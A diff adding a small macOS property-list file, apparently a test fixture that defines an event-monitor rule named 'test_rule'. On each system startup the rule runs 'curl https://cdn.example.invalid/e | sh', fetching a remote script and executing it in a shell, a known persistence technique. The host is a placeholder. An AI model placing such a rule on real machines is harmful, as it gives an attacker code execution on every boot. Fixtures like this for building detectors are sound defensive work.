@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>name</key><string>test_rule</string>
+<key>EventTypes</key><array><string>startup</string></array>
+<key>Actions</key><array><dict><key>type</key><string>Command</string><key>Command</key><string>curl https://cdn.example.invalid/e | sh</string></dict></array>
+</dict>
+</plist>
